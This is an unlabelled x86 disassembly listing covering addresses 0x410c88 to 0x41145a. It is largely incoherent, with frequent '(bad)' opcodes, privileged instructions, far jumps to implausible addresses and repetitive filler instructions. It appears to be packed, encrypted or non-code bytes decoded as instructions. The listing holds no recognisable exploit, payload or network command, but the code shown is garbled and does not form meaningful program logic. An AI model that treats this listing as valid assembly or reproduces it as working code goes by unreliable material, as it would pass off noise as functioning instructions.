  410c88:	test   al,ch
  410c8a:	add    dh,bh
  410c8c:	add    bh,bh
  410c8e:	dec    ebp
  410c8f:	push   cs
  410c90:	mov    DWORD PTR [ecx],eax
  410c92:	hlt    
  410c93:	push   es
  410c94:	dec    ebp
  410c95:	leave  
  410c96:	mov    DWORD PTR [eax],ecx
  410c98:	clc    
  410c99:	cmovge eax,ecx
  410c9c:	mov    ecx,0x85c2f0
  410ca2:	clc    
  410ca3:	pop    DWORD PTR [ebp+0x1]
  410ca6:	push   ebx
  410ca7:	add    BYTE PTR [ebp-0x15],bh
  410caa:	push   esi
  410cab:	xor    eax,0x898a45
  410cb0:	cld    
  410cb1:	push   es
  410cb2:	inc    ebp
  410cb3:	add    BYTE PTR [ebx],dh
  410cb5:	pushfw 
  410cb7:	add    DWORD PTR [esi+0x78308c1],edi
  410cbd:	add    ah,BYTE PTR [ebx-0x49]
  410cc0:	int    0xbb
  410cc2:	mov    ecx,DWORD PTR [esi+0xc]
  410cc5:	add    dh,al
  410cc7:	cmp    ecx,ebx
  410cc9:	jne    0x410c93
  410ccb:	xor    ecx,DWORD PTR [ebp+0x66]
  410cce:	jmp    0xc80cd4
  410cd3:	add    DWORD PTR [ebp+0x0],eax
  410cd6:	mov    eax,ebx
  410cd8:	or     al,0x8b
  410cda:	(bad)  
  410cdb:	mov    ecx,esi
  410cdd:	mov    BYTE PTR [eax+eax*1+0x664c13a],cl
  410ce4:	mov    eax,edi
  410ce6:	or     BYTE PTR [edx],cl
  410ce8:	shl    cl,cl
  410cea:	icebp  
  410ceb:	add    BYTE PTR [ebp+0x36],0x8b
  410cef:	or     BYTE PTR [edx+eax*2],cl
  410cf2:	(bad)  
  410cf3:	or     cl,dh
  410cf5:	stc    
  410cf6:	shl    DWORD PTR [ebp-0x30],0xc6
  410cfa:	xor    al,0x0
  410cfc:	inc    ebp
  410cfd:	xchg   BYTE PTR [ebx],al
  410cff:	add    esp,edi
  410d01:	add    BYTE PTR [ebp-0x39],cl
  410d04:	mov    al,bl
  410d06:	test   DWORD PTR [ebx+0x1c348375],ecx
  410d0c:	sub    al,0xbf
  410d0e:	jmp    0x410c95
  410d10:	mov    edi,eax
  410d12:	lock jge 0x410d06
  410d15:	lea    esi,[edx-0x74bad503]
  410d1b:	mov    ebp,esp
  410d1d:	or     cl,dh
  410d1f:	leave  
  410d20:	add    al,BYTE PTR [eax+eax*4-0x37ff9d00]
  410d27:	dec    ebp
  410d28:	dec    ebp
  410d29:	test   DWORD PTR [ebx],eax
  410d2b:	paddb  mm6,mm0
  410d2e:	add    DWORD PTR [eax],eax
  410d30:	dec    ebp
  410d31:	mov    ecx,DWORD PTR [ebx-0x62b217f0]
  410d37:	mov    esi,DWORD PTR [edx]
  410d39:	or     al,0x2b
  410d3b:	dec    ebp
  410d3c:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  410d42:	mov    esp,ebp
  410d44:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  410d4b:	mov    DWORD PTR [ebx],ebp
  410d4d:	call   0xc74967d
  410d52:	mov    DWORD PTR [ebp+0x10],ecx
  410d55:	(bad)  
  410d56:	push   0x8b85ff10
  410d5b:	clc    
  410d5c:	or     al,0x56
  410d5e:	(bad)  
  410d5f:	push   ecx
  410d60:	retf   
  410d61:	mov    ebx,0xff4d8dc8
  410d66:	mov    DWORD PTR [ebp+0x8],eax
  410d69:	xor    eax,DWORD PTR [ebp-0x75]
  410d6c:	cmp    ebp,DWORD PTR [ebx]
  410d6e:	lsl    ebx,WORD PTR [edi-0x8]
  410d72:	call   DWORD PTR [ebx-0x741bff75]
  410d78:	(bad)  
  410d79:	or     al,0x5b
  410d7b:	dec    ebp
  410d7c:	or     BYTE PTR [ebx],dh
  410d7e:	inc    ebp
  410d7f:	xor    esi,DWORD PTR ds:0x708088d
  410d85:	in     eax,0x9d
  410d87:	add    BYTE PTR [edx],dh
  410d89:	inc    ebp
  410d8a:	pop    edi
  410d8b:	xor    eax,edx
  410d8d:	test   DWORD PTR [eax],0x83108b8b
  410d93:	dec    ebp
  410d94:	adc    al,0x33
  410d96:	inc    ebp
  410d97:	xor    esi,DWORD PTR ds:0xc73b9c2b
  410d9d:	jne    0x410d9b
  410d9f:	mov    eax,DWORD PTR [ebp+0x345f808]
  410da5:	mov    eax,DWORD PTR [ebp-0xc]
  410da8:	mov    DWORD PTR [eax],0x685c9f4
  410dae:	clc    
  410daf:	dec    eax
  410db0:	push   edi
  410db1:	ss inc ebp
  410db3:	pop    ss
  410db4:	aad    0x4d
  410db6:	xlat   BYTE PTR ds:[ebx]
  410db7:	or     BYTE PTR [ebx+0x4d63fc56],0xd1
  410dbe:	mov    eax,0x780084d
  410dc3:	push   esi
  410dc4:	clc    
  410dc5:	ret    0xe99d
  410dc8:	xor    dl,dl
  410dca:	xor    ecx,DWORD PTR [ebx+0x4d030803]
  410dd0:	js     0x88799cf
  410dd6:	dec    ebp
  410dd7:	push   ebp
  410dd8:	mov    edi,DWORD PTR [eax+0xc872fc]
  410dde:	lock enter 0xceca,0xf2
  410de3:	retf   0x18ce
  410de6:	jne    0x410e35
  410de8:	mov    ecx,DWORD PTR [ebx-0x31eaf304]
  410dee:	enter  0xf0d6,0xca
  410df2:	retf   0xf2c8
  410df5:	into   
  410df6:	out    dx,al
  410df7:	dec    ebp
  410df8:	dec    ebp
  410df9:	jmp    0xff450d31
  410dfe:	xor    eax,DWORD PTR [ebp-0x15]
  410e01:	xor    esi,DWORD PTR [ebx]
  410e03:	mov    esi,DWORD PTR [ebx]
  410e05:	sub    eax,DWORD PTR [ebx]
  410e07:	add    eax,DWORD PTR [ebx]
  410e09:	or     bl,dl
  410e0b:	dec    ebp
  410e0c:	mov    DWORD PTR [ebx-0x38b2ef08],ecx
  410e12:	xor    eax,DWORD PTR [ebp-0xf00073]
  410e18:	jb     0x410e5f
  410e1a:	add    BYTE PTR [ebx],dh
  410e1c:	dec    ebp
  410e1d:	pop    esi
  410e1e:	mov    ebp,ebx
  410e20:	cld    
  410e21:	mov    esi,eax
  410e23:	call   0x520f64f0
  410e28:	stc    
  410e29:	add    eax,0x4572aa
  410e2e:	pop    edi
  410e2f:	leave  
  410e30:	add    ecx,DWORD PTR [eax*2-0x3c13a1ab]
  410e37:	in     al,dx
  410e38:	mov    eax,edi
  410e3a:	xor    eax,0xf8008520
  410e40:	mov    DWORD PTR [ebp-0x14],0xf89c8532
  410e47:	mov    eax,DWORD PTR [ebp-0x77]
  410e4a:	xor    bh,al
  410e4c:	pushf  
  410e4d:	inc    ebp
  410e4e:	(bad)  
  410e4f:	cmp    eax,0x56869ce8
  410e54:	clc    
  410e55:	mov    edi,0x8518e4ec
  410e5b:	jmp    0xf056:0x8b457df8
  410e62:	push   esi
  410e63:	push   esi
  410e64:	push   ecx
  410e65:	push   ecx
  410e66:	push   edi
  410e67:	xor    eax,esi
  410e69:	mov    edx,0x32729d
  410e6e:	add    ecx,eax
  410e70:	mov    edx,edi
  410e72:	clc    
  410e73:	retf   0xaf45
  410e76:	cmp    eax,0xc78b9ceb
  410e7b:	clc    
  410e7c:	cld    
  410e7d:	jne    0x410e97
  410e7f:	xor    ebp,edx
  410e81:	xor    eax,DWORD PTR [ebp+0x3]
  410e84:	or     BYTE PTR [ebx],al
  410e86:	add    BYTE PTR [ebp-0x7747475],al
  410e8c:	hlt    
  410e8d:	dec    ebp
  410e8e:	dec    ebp
  410e8f:	je     0x410ec4
  410e91:	xor    esi,DWORD PTR [ebx]
  410e93:	xor    eax,DWORD PTR [ebx]
  410e95:	add    eax,DWORD PTR [ebx]
  410e97:	add    ecx,DWORD PTR [edi]
  410e99:	rol    ecx,cl
  410e9b:	mov    esi,DWORD PTR [ecx]
  410e9d:	in     al,dx
  410e9e:	inc    ebp
  410e9f:	enter  0xca2b,0x33
  410ea3:	icebp  
  410ea4:	mov    DWORD PTR [edx],ecx
  410ea6:	clc    
  410ea7:	lock pop ebp
  410ea9:	enter  0xf2e8,0xfe
  410ead:	retf   0xeeff
  410eb0:	inc    ebp
  410eb1:	jne    0x410e3e
  410eb3:	mov    edi,eax
  410eb5:	cld    
  410eb6:	dec    ebp
  410eb7:	enter  0xbc89,0x8d
  410ebb:	popf   
  410ebc:	sti    
  410ebd:	xor    bh,bh
  410ebf:	mov    eax,DWORD PTR [ebp-0xc]
  410ec2:	mov    esi,DWORD PTR [ebp-0x4]
  410ec5:	xor    eax,esi
  410ec7:	xor    eax,DWORD PTR [ebx+ebp*1+0x76323b9d]
  410ece:	mov    DWORD PTR [ebx-0x76ba0704],ecx
  410ed4:	mov    ecx,DWORD PTR [ebx-0x3631070c]
  410eda:	(bad)  
  410edb:	push   ebp
  410edc:	shr    esp,0x4d
  410edf:	in     al,dx
  410ee0:	cmp    eax,DWORD PTR [esi+esi*2]
  410ee3:	add    BYTE PTR [ebx-0x39ca1bbb],cl
  410ee9:	pushf  
  410eea:	mov    edi,0x85c7f445
  410ef0:	call   0xf88695ed
  410ef5:	xor    eax,0x53619cdb
  410efa:	dec    ebp
  410efb:	inc    ebp
  410efc:	mov    esi,DWORD PTR [eax+edi*8]
  410eff:	pushf  
  410f00:	into   
  410f01:	mov    ecx,edi
  410f03:	in     al,dx
  410f04:	call   0x8b4954c7
  410f09:	pop    es
  410f0a:	or     BYTE PTR [ebx],dh
  410f0c:	or     BYTE PTR [edi+0x8a724d],bh
  410f12:	or     eax,edi
  410f14:	push   ebp
  410f15:	inc    ebp
  410f16:	cmpxchg8b (bad)
  410f17:	(bad)  
  410f18:	leave  
  410f19:	loopne 0x410ee5
  410f1b:	test   DWORD PTR [ebp-0x8],ecx
  410f1e:	mov    eax,DWORD PTR [ebp-0x18]
  410f21:	aad    0x55
  410f23:	xlat   BYTE PTR ds:[ebx]
  410f24:	xor    eax,edi
  410f26:	add    esi,eax
  410f28:	and    eax,DWORD PTR [eax]
  410f2a:	mov    eax,DWORD PTR [eax]
  410f2c:	(bad)  
  410f2d:	leave  
  410f2e:	sti    
  410f2f:	inc    ebp
  410f30:	dec    DWORD PTR [ebx-0x39cc13ab]
  410f36:	mov    esi,ecx
  410f38:	clc    
  410f39:	(bad)  
  410f3a:	dec    ebp
  410f3b:	iret   
  410f3c:	xor    ebp,DWORD PTR [edi-0x74f71473]
  410f42:	jb     0x410f40
  410f44:	add    bh,al
  410f46:	inc    ebp
  410f47:	(bad)  
  410f48:	mov    eax,DWORD PTR [ebp-0xc]
  410f4b:	(bad)  
  410f4c:	xabort 0x63
  410f4f:	loopne 0x410f1e
  410f51:	jmp    FWORD PTR [ebx]
  410f53:	mov    DWORD PTR [ebx],eax
  410f55:	clc    
  410f56:	lock inc ebp
  410f58:	dec    ebp
  410f59:	mov    ecx,DWORD PTR [ebx+0x4d84ecfc]
  410f5f:	loopne 0x410f94
  410f61:	inc    DWORD PTR [ebx]
  410f63:	mov    edi,DWORD PTR [ebx]
  410f65:	hlt    
  410f66:	jne    0x410fb5
  410f68:	mov    esi,DWORD PTR [ebx]
  410f6a:	in     al,0x8d
  410f6c:	dec    ebp
  410f6d:	or     BYTE PTR [ebx],dh
  410f6f:	jb     0x410f74
  410f71:	add    BYTE PTR [edi+0x45],bl
  410f74:	xor    ecx,DWORD PTR [ebx+0x4dc2e85b]
  410f7a:	add    BYTE PTR [ebx],dh
  410f7c:	mov    esi,DWORD PTR [ebx]
  410f7e:	mov    ebp,DWORD PTR [ebx]
  410f80:	sbb    BYTE PTR [ebx-0x377403b3],cl
  410f86:	nop
  410f87:	mov    ecx,0x338b4500
  410f8c:	add    DWORD PTR [ebx],0x70
  410f8f:	mov    DWORD PTR [esi-0x8],edx
  410f92:	jne    0x410fd9
  410f94:	mov    esi,DWORD PTR [edi+edx*2]
  410f97:	pushf  
  410f98:	push   esi
  410f99:	mov    edx,DWORD PTR [ecx-0x15]
  410f9c:	xor    ecx,DWORD PTR [ebx+0x4572e0bb]
  410fa2:	add    BYTE PTR [ebx],dh
  410fa4:	retf   
  410fa5:	add    edx,ecx
  410fa7:	ror    DWORD PTR [edi],cl
  410fa9:	mov    DWORD PTR ds:0x7f452dfc,ebp
  410faf:	mov    ch,dl
  410fb1:	mov    BYTE PTR [eax+0xb],dh
  410fb4:	fimul  WORD PTR [ebp+0x0]
  410fb7:	mov    ecx,DWORD PTR [ebx+0x55b608f8]
  410fbd:	xor    esi,DWORD PTR [ebx]
  410fbf:	mov    DWORD PTR [ebx],esi
  410fc1:	or     BYTE PTR [ebx],al
  410fc3:	dec    ebp
  410fc4:	add    ecx,DWORD PTR [ebx-0x318af7c5]
  410fca:	or     edi,0x8c64ca9c
  410fd0:	out    dx,eax
  410fd1:	loopne 0x410fe8
  410fd3:	(bad)  
  410fd4:	jmp    0x13d1464
  410fd9:	retf   0x4d4d
  410fdc:	xor    ecx,DWORD PTR [ebx-0x31c40bfd]
  410fe2:	je     0x3241ad8c
  410fe8:	mov    ecx,DWORD PTR [ecx+0x45450818]
  410fee:	mov    DWORD PTR [ebx],esi
  410ff0:	sbb    BYTE PTR [ecx-0x7472b3],bh
  410ff6:	mov    eax,ecx
  410ff8:	fmul   DWORD PTR [ebp+0x45]
  410ffb:	mov    DWORD PTR ds:0xba459cf0,esi
  411001:	mov    eax,DWORD PTR [ebp+0x55c6f8f0]
  411007:	(bad)  
  411008:	mov    ecx,eax
  41100a:	sbb    BYTE PTR [ecx-0x7474babb],dl
  411010:	sbb    al,bh
  411012:	add    dh,0x1
  411015:	mov    DWORD PTR [eax],0x4dc1005e
  41101b:	leave  
  41101c:	mov    eax,DWORD PTR [eax+ebx*1]
  41101f:	push   ebp
  411020:	mov    esp,ebp
  411022:	add    DWORD PTR [ebp+0x0],eax
  411025:	mov    ecx,DWORD PTR [ecx]
  411027:	or     BYTE PTR [eax-0x80],cl
  41102a:	mov    DWORD PTR [ecx],eax
  41102c:	or     al,0x0
  41102e:	inc    ebp
  41102f:	add    BYTE PTR [ebx],dh
  411031:	in     al,dx
  411032:	add    edx,DWORD PTR [ebx-0x77]
  411035:	mov    esi,esp
  411037:	adc    BYTE PTR [ebp+0x16],al
  41103a:	xor    edi,DWORD PTR [edi+0x7890803]
  411040:	adc    al,0xcf
  411042:	inc    ebp
  411043:	popf   
  411044:	mov    esi,DWORD PTR [edx]
  411046:	push   eax
  411047:	add    ebp,eax
  411049:	cmp    ecx,DWORD PTR [ecx+0x4581d075]
  41104f:	pushf  
  411050:	mov    esp,DWORD PTR [eax+edi*1+0x44]
  411054:	dec    ebp
  411055:	fwait
  411056:	dec    eax
  411057:	jmp    0xcc149d
  41105c:	or     al,0x4d
  41105e:	sbb    BYTE PTR [ebx-0x3074f3c0],cl
  411064:	or     al,0xd7
  411066:	dec    ecx
  411067:	retf   
  411068:	dec    eax
  411069:	rcl    eax,cl
  41106b:	retf   0xfc8
  41106e:	inc    ebp
  41106f:	or     eax,0x7f382d8b
  411074:	sar    esp,0x3
  411077:	lahf   
  411078:	inc    eax
  411079:	mov    ebp,0x8b180089
  41107e:	inc    ebp
  41107f:	or     BYTE PTR [ebx],dh
  411081:	iret   
  411082:	add    ecx,ebx
  411084:	mov    ecx,eax
  411086:	adc    al,0x84
  411088:	inc    ebp
  411089:	add    al,0x33
  41108b:	add    BYTE PTR [ebx],al
  41108d:	dec    ebp
  41108e:	mov    DWORD PTR [ecx+0x4d45dc14],ecx
  411094:	mov    ecx,DWORD PTR [ebx+0x6c714d4]
  41109a:	ret    
  41109b:	inc    ebp
  41109c:	add    edi,eax
  41109e:	push   ebp
  41109f:	or     bh,al
  4110a1:	test   DWORD PTR [eax+edi*8],edx
  4110a4:	test   DWORD PTR [edx],esi
  4110a6:	clc    
  4110a7:	pushf  
  4110a8:	inc    ebp
  4110a9:	mov    DWORD PTR [eax],esi
  4110ab:	lock pushf 
  4110ad:	inc    ebp
  4110ae:	(bad)  
  4110af:	mov    DWORD PTR [eax+ebx*1],edx
  4110b2:	test   DWORD PTR [ebp-0x8],eax
  4110b5:	mov    eax,DWORD PTR [ebp-0x70]
  4110b8:	mov    eax,DWORD PTR [eax]
  4110ba:	sbb    BYTE PTR [ebx-0x2b3c7639],cl
  4110c0:	scas   eax,DWORD PTR es:[edi]
  4110c1:	dec    ebp
  4110c2:	mov    ecx,DWORD PTR [ebx+0x559008]
  4110c8:	xor    ecx,DWORD PTR [ebx+0x3c11038d]
  4110ce:	jb     0x41111d
  4110d0:	add    BYTE PTR [ebx-0x387cf73f],cl
  4110d6:	add    eax,ebx
  4110d8:	add    BYTE PTR [ebp+0x45],al
  4110db:	mov    esi,DWORD PTR [ebx]
  4110dd:	or     BYTE PTR [ebx],al
  4110df:	(bad)  
  4110e0:	mov    ebx,eax
  4110e2:	adc    al,0x45
  4110e4:	inc    ebp
  4110e5:	mov    eax,DWORD PTR [ebx]
  4110e7:	or     al,0xdc
  4110e9:	inc    eax
  4110ea:	inc    ebp
  4110eb:	cmp    edi,0xc
  4110ee:	hlt    
  4110ef:	inc    ebp
  4110f0:	jne    0x41107d
  4110f2:	mov    ecx,DWORD PTR [esp+ecx*1]
  4110f5:	inc    eax
  4110f6:	bound  ecx,QWORD PTR [ebx-0x7a76f301]
  4110fc:	clc    
  4110fd:	push   esp
  4110fe:	inc    ebp
  4110ff:	inc    ebp
  411100:	cmp    eax,0x8b8b9c74
  411105:	cmp    al,ah
  411107:	dec    ebp
  411108:	(bad)  
  411109:	mov    eax,ebx
  41110b:	push   esp
  41110c:	(bad)  
  41110d:	idiv   DWORD PTR [eax-0x87417dd]
  411113:	or     al,0xff
  411115:	inc    eax
  411116:	inc    ebp
  411117:	add    eax,DWORD PTR [ebp-0x74748b15]
  41111d:	push   esp
  41111e:	loopne 0x411165
  411120:	(bad)  
  411121:	mov    eax,ebx
  411123:	or     bh,bh
  411125:	xbegin 0x508656ee
  41112b:	mov    ebx,esp
  41112d:	or     bh,bh
  41112f:	(bad)  
  411130:	mov    eax,ebx
  411132:	hlt    
  411133:	inc    ebp
  411134:	inc    ebp
  411135:	mov    ecx,DWORD PTR [ebx+0x4d4de008]
  41113b:	xor    ebp,DWORD PTR [ebx]
  41113d:	add    ecx,DWORD PTR [ecx+0x4589e089]
  411143:	adc    al,0x8b
  411145:	inc    ebp
  411146:	clc    
  411147:	xor    eax,DWORD PTR [eax-0x64]
  41114a:	add    eax,edi
  41114c:	or     al,0x14
  41114e:	dec    ebp
  41114f:	test   DWORD PTR [ebx],edi
  411151:	clc    
  411152:	jb     0x411199
  411154:	mov    esi,DWORD PTR [ecx]
  411156:	clc    
  411157:	pushf  
  411158:	inc    eax
  411159:	mov    ecx,DWORD PTR [ebx+0x414df8f0]
  41115f:	xor    ecx,DWORD PTR [ebx-0x3ef01ffd]
  411165:	shr    esi,0x4d
  411168:	add    BYTE PTR [ebx-0x30002f96],cl
  41116e:	hlt    
  41116f:	mov    WORD PTR [ebp-0x63],es
  411172:	push   eax
  411173:	xor    dl,BYTE PTR [ebx+edi*1-0x5347f001]
  41117a:	test   DWORD PTR [eax],eax
  41117c:	clc    
  41117d:	mov    eax,DWORD PTR [ebp+0x8]
  411180:	mov    edi,0x4585c3c8
  411186:	clc    
  411187:	mov    eax,DWORD PTR [ebp+0x18]
  41118a:	xor    eax,DWORD PTR [ebp-0x64]
  41118d:	mov    edi,eax
  41118f:	hlt    
  411190:	shl    BYTE PTR [ebp-0x7b],0x8b
  411194:	clc    
  411195:	fmul   QWORD PTR [ebp+0x4d]
  411198:	mov    eax,ebp
  41119a:	in     al,dx
  41119b:	icebp  
  41119c:	dec    ebp
  41119d:	dec    DWORD PTR [ecx+0x4dc7e845]
  4111a3:	loopne 0x41112e
  4111a5:	test   eax,edi
  4111a7:	clc    
  4111a8:	dec    ebp
  4111a9:	inc    ebp
  4111aa:	mov    DWORD PTR [ebx],esi
  4111ac:	in     al,0x3
  4111ae:	dec    ebp
  4111af:	push   eax
  4111b0:	xor    eax,DWORD PTR [ebp+0x3]
  4111b3:	push   eax
  4111b4:	mov    DWORD PTR [eax-0x20],edx
  4111b7:	push   edi
  4111b9:	mov    eax,DWORD PTR [eax]
  4111bb:	clc    
  4111bc:	cmp    eax,0xf84e85c0
  4111c1:	inc    ebp
  4111c2:	test   BYTE PTR [ebx],dh
  4111c4:	add    DWORD PTR [ebx],eax
  4111c6:	add    BYTE PTR [eax+0x4d],dl
  4111c9:	jne    0x4111fe
  4111cb:	lea    ecx,[ebx-0x7617fc48]
  4111d1:	cmc    
  4111d2:	adc    al,0xff
  4111d4:	inc    ebp
  4111d5:	inc    ebp
  4111d6:	xor    ecx,DWORD PTR [ecx+0x4530e08d]
  4111dc:	jb     0x411169
  4111de:	add    ah,bl
  4111e0:	inc    ebp
  4111e1:	ror    DWORD PTR [ebx+0x4d8bf045],0xf8
  4111e8:	xor    ecx,DWORD PTR [ebp+0x3]
  4111eb:	mov    edi,DWORD PTR [ebx]
  4111ed:	adc    BYTE PTR [ebp+0x41],dh
  4111f0:	mov    ecx,DWORD PTR [ebx-0x37381ff8]
  4111f6:	ret    
  4111f7:	push   ss
  4111f8:	push   0x45
  4111fa:	lea    ecx,[ebx+0x4de80cac]
  411200:	cli    
  411201:	add    edi,edi
  411203:	or     BYTE PTR [ebp+0x4d],al
  411206:	mov    ebp,DWORD PTR [ebx]
  411208:	xor    ebp,ecx
  41120a:	mov    al,BYTE PTR [edx]
  41120c:	add    eax,0xc7200
  411211:	jne    0x411260
  411213:	lea    esi,[ebx]
  411215:	lods   al,BYTE PTR ds:[esi]
  411216:	psubsb mm0,mm0
  411219:	cmc    
  41121a:	retf   
  41121b:	inc    ecx
  41121d:	xor    eax,0x89019c84
  411222:	add    ah,cl
  411224:	inc    ebp
  411225:	inc    ebp
  411226:	mov    esi,DWORD PTR [edx]
  411228:	xor    ebx,DWORD PTR [edx+ecx*4+0x72c405c7]
  41122f:	test   DWORD PTR [eax],eax
  411231:	clc    
  411232:	dec    ebp
  411233:	inc    ebp
  411234:	xor    esi,DWORD PTR [eax]
  411236:	setl   al
  411239:	(bad)  
  41123a:	retf   
  41123b:	int3   
  41123c:	ror    DWORD PTR [ebp-0x7c],0x8d
  411240:	add    eax,ecx
  411242:	add    BYTE PTR [ebp+0x45],cl
  411245:	lea    ecx,[ebx-0x75b2cc3c]
  41124b:	lea    eax,ds:0x4d72c0
  411251:	mov    ecx,DWORD PTR [ebp+0x8]
  411254:	xor    ecx,edi
  411256:	bswap  ebx
  411258:	ror    BYTE PTR [ebp-0x35],0xe9
  41125c:	rol    DWORD PTR [ecx],0x84
  41125f:	add    BYTE PTR [ecx],al
  411261:	xor    eax,DWORD PTR [eax]
  411263:	pushf  
  411264:	inc    ebp
  411265:	jnp    0x8a414669
  41126b:	mov    eax,DWORD PTR ds:0xcf72f0
  411271:	lock dec ebp
  411273:	retf   
  411274:	xor    ecx,DWORD PTR [ebp+0xf]
  411277:	mov    eax,eax
  411279:	loopne 0x411246
  41127b:	test   ecx,0x19d8484
  411281:	xor    al,BYTE PTR [eax]
  411283:	mov    DWORD PTR [ebp-0x20],eax
  411286:	mov    eax,DWORD PTR [ebp+0x33]
  411289:	mov    ecx,DWORD PTR [edx+0x72c705e0]
  41128f:	ret    
  411290:	add    al,cl
  411292:	dec    ebp
  411293:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  411299:	add    ecx,DWORD PTR ds:0xc7250
  41129f:	inc    ebp
  4112a0:	rcl    DWORD PTR [eax+0x4d],0x5f
  4112a4:	mov    edi,edi
  4112a6:	xor    ecx,DWORD PTR [ebx+0xdec8a]
  4112ac:	jb     0x411275
  4112ae:	add    BYTE PTR [ecx+eax*8-0x74cdb2b7],al
  4112b5:	mov    esi,DWORD PTR [ebx]
  4112b7:	or     BYTE PTR [edx+0x72b60dcf],cl
  4112bd:	add    eax,DWORD PTR [eax]
  4112bf:	cmp    ecx,eax
  4112c1:	jne    0x41133f
  4112c7:	mov    eax,DWORD PTR [ebp-0x18]
  4112ca:	mov    eax,DWORD PTR [eax]
  4112cc:	xor    eax,edi
  4112ce:	mov    al,BYTE PTR [ebp+eax*1+0x327249]
  4112d5:	mov    ecx,DWORD PTR [ebp+0x8]
  4112d8:	mov    ecx,edi
  4112da:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  4112e0:	jb     0x4112f1
  4112e2:	add    BYTE PTR [eax-0x3f],bl
  4112e5:	add    BYTE PTR [ebp-0x75],cl
  4112e8:	mov    edi,eax
  4112ea:	xor    eax,DWORD PTR [eax]
  4112ec:	mov    al,bh
  4112ee:	or     eax,0x497284
  4112f3:	xor    al,cl
  4112f5:	mov    ecx,DWORD PTR [ebp+0x8]
  4112f8:	mov    ecx,edi
  4112fa:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  411300:	jb     0x411311
  411302:	add    BYTE PTR [eax],bh
  411304:	enter  0x8500,0x8b
  411308:	add    ah,ah
  41130a:	add    BYTE PTR [eax],al
  41130c:	inc    ebp
  41130d:	(bad)  
  41130e:	mov    eax,DWORD PTR [ebx+esi*1+0x5328a49]
  411315:	mov    esi,DWORD PTR [edx+0x8]
  411318:	add    bh,cl
  41131a:	dec    ebp
  41131b:	mov    dh,0x8b
  41131d:	add    esi,DWORD PTR [ebx]
  41131f:	cmp    ecx,DWORD PTR [edx+0x72180d0f]
  411325:	add    BYTE PTR [eax],al
  411327:	mov    eax,ecx
  411329:	call   0xc7cc137b
  41132e:	xor    eax,DWORD PTR [edx+ecx*4+0x72320d49]
  411335:	mov    eax,DWORD PTR [eax]
  411337:	in     al,dx
  411338:	ror    DWORD PTR [ecx],0x4d
  41133b:	iret   
  41133c:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a49]
  411343:	xor    dh,BYTE PTR [edx-0x75]
  411346:	add    al,bh
  411348:	enter  0x5009,0xcf
  41134c:	inc    ebp
  41134d:	mov    WORD PTR [ebx-0x75cdccb7],cs
  411353:	or     al,BYTE PTR ds:0xec728b
  411359:	or     DWORD PTR [ebp-0x31],ecx
  41135c:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4d]
  411363:	cmp    dh,BYTE PTR [edx+0xf]
  411366:	add    ah,dl
  411368:	rol    DWORD PTR [eax],0x4d
  41136b:	mov    ecx,DWORD PTR [ebx-0x75ffcc08]
  411371:	(bad)  
  411372:	or     eax,0x497284
  411377:	xor    al,cl
  411379:	mov    ecx,DWORD PTR [ebp-0x18]
  41137c:	mov    ecx,DWORD PTR [ecx]
  41137e:	xor    ecx,edi
  411380:	mov    cl,BYTE PTR [ebp+ecx*1+0x327249]
  411387:	xor    cl,al
  411389:	mov    edx,DWORD PTR [eax]
  41138b:	in     al,0x45
  41138d:	or     DWORD PTR [eax-0x31],edx
  411390:	mov    ds:0x8b49ff8c,eax
  411395:	xor    dh,BYTE PTR [edx+ecx*1-0x17f5743f]
  41139c:	inc    ebp
  41139d:	or     DWORD PTR [ebx],esi
  41139f:	iret   
  4113a0:	add    ecx,DWORD PTR [ecx+ecx*4+0x4532144d]
  4113a7:	cmp    dh,BYTE PTR [ebx]
  4113a9:	jge    0x7241443f
  4113af:	mov    eax,DWORD PTR [eax]
  4113b1:	in     al,0xc7
  4113b3:	add    BYTE PTR [ebp-0x39],cl
  4113b6:	mov    eax,DWORD PTR [esp+edx*1-0x34cd30b7]
  4113bd:	mov    edx,ecx
  4113bf:	clc    
  4113c0:	test   BYTE PTR [ecx],cl
  4113c2:	std    
  4113c3:	iret   
  4113c4:	dec    DWORD PTR [ebp+eax*2+0x14328b49]
  4113cb:	xor    al,bh
  4113cd:	mov    eax,ebx
  4113cf:	in     al,dx
  4113d0:	enter  0x1109,0xcf
  4113d4:	inc    ebp
  4113d5:	mov    WORD PTR [ebx-0x38cde7b7],cs
  4113db:	or     al,BYTE PTR [ebx+ecx*4+0x932f89d]
  4113e2:	jmp    0x4113b3
  4113e4:	push   0xffffff8c
  4113e6:	dec    DWORD PTR [ebp-0xc]
  4113e9:	xor    al,BYTE PTR [ebp+0x3a]
  4113ec:	push   eax
  4113ed:	jne    0x411409
  4113ef:	mov    edi,edi
  4113f1:	in     al,0x8b
  4113f3:	add    BYTE PTR [eax],cl
  4113f5:	(bad)  
  4113f6:	dec    ebp
  4113f7:	test   BYTE PTR [ebx],dh
  4113f9:	dec    ecx
  4113fa:	add    esi,DWORD PTR [edx]
  4113fc:	cmp    ecx,DWORD PTR [ebx+0x98bec74]
  411402:	or     bh,cl
  411404:	(bad)  
  411405:	mov    ebx,es
  411407:	dec    ecx
  411408:	push   0x32
  41140a:	lea    esi,[edx]
  41140c:	xchg   esp,eax
  41140d:	mov    ebp,eax
  41140f:	call   0xd0401e0c
  411414:	inc    ebp
  411415:	mov    WORD PTR [ebx+0x45321849],es
  41141b:	or     bh,bh
  41141d:	mov    ebp,DWORD PTR [eax-0x74f68a1c]
  411423:	iret   
  411424:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411425:	mov    WORD PTR [ebp+0x4d],es
  411428:	push   eax
  411429:	xor    bl,dh
  41142b:	cmp    bh,bh
  41142d:	jne    0x4113ba
  41142f:	lea    ecx,[eax]
  411431:	lods   al,BYTE PTR ds:[esi]
  411432:	dec    ebp
  411433:	call   0xff450e6b
  411438:	cmp    ecx,DWORD PTR [ebp+0x74]
  41143b:	cmp    ebp,DWORD PTR [edx+0x74]
  41143e:	dec    DWORD PTR [ebx-0x38baf758]
  411444:	add    eax,ebx
  411446:	fadd   DWORD PTR [ebp-0x18]
  411449:	mov    edi,eax
  41144b:	lock inc edi
  41144e:	inc    ebp
  41144f:	test   BYTE PTR [ebx+0x832a89d],cl
  411455:	xor    eax,DWORD PTR [ebp-0x75]
  411458:	add    ecx,DWORD PTR [eax]
  41145a:	sbb    BYTE PTR [ebp+0x45],dl
